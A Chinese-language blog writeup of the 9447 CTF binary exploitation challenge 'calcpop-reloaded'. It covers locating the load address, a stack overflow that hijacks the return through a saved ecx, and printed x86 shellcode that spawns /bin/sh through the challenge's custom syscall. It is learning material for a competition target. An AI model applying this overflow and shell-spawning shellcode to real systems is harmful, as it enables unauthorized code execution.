---
title: 'Writeup-9447 CTF: calcpop-reloaded'
layout: post
categories: blog
tags: [Hack, CTF, Writeup, Exploitation]
share: true
---

*从这一题开始，9447 加上了 POW, 其实只要爆破就可以，这里就不放脚本了。（关于 POW, 有个叫 hashcash 的东西，挺有意思的）*

这道题我没有在比赛期间做出来。当时完全没有逆向 load address 未知的二进制的经验，什么都干不了。后来简单看了别人的 writeup，在只知道逆向方法的情况下重新做出了这题。前后大概还是花了七八小时（我好渣...），硬着头皮写篇 writeup 记录一下。

### Load Address
找 load address 的过程大概是先用 radare 打开，然后翻反汇编代码，可以找到`mov eax, 0x1007a7`这类代码，大概可以猜出 load address 在 0x100000.

用 IDA 打开，填好 load offset, 开始调试。可以猜出 main 函数(?)的位置大概在 0x1008bc.

### Overflow
接下来找溢出点。可以看到 0x001008EE 处调用了输入函数，分配栈空间是 0x98, 但是传递了一个大概是 size 的参数，值为 0x100. 存在溢出。

这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用`shutdown()`之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。

接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化：
{% highlight nasm %}
; entry:
lea     ecx, [esp-4]
and     esp, 0FFFFFFF0h
push    dword ptr [ecx-4]
push    ebp
mov     ebp, esp
push    edi
push    esi
push    ebx
push    ecx

; exit:
lea     esp, [ebp-10h]
xor     eax, eax
pop     ecx
pop     ebx
pop     esi
pop     edi
pop     ebp
lea     esp, [ecx-4]
retn
{% endhighlight %}

溢出到保存 ecx 的位置，使 ecx - 4 指向存有 shellcode 地址的栈位置，然后 ret 就能跳转到 shellcode.

### Shellcode
这题怎么写 shellcode 也是一个难点，因为系统是 9447 写的，不能直接用 execv 系统调用。所幸的是本题的系统调用功能都是能从一些字符串上看出来的。比如`read(%d %x %d)`, `write(%d %x %d)`之类。strings 一下可以看到`spawn(%x %x %d)`，我就猜测这个是类似 execv 的系统调用。可是参数不明确，特别是第三个参数。试了几次，发现用`spawn("/bin/sh", "/bin/sh", 1)`这样的参数是可以成功的，第三个参数 1 具体是什么含义，我也没搞明白。

用 pwntool 生成的 shellcode 如下:
{% highlight nasm %}
; push '/bin/sh\x00'
push 0x1010101
xor dword ptr [esp], 0x169722e
push 0x6e69622f
mov edi, esp

push 0x1
push edi
push edi
push 0xdeadbeef  ; junk
mov ebx, 302125832
xor ebx, 0x12121212
call ebx  ; spawn(%x, %x, %d)
{% endhighlight %}

### exp.py

可以用 redos 中的 level1 本地调试。

{% gist cubarco/b4aee1ac22f1b3039d30 %}
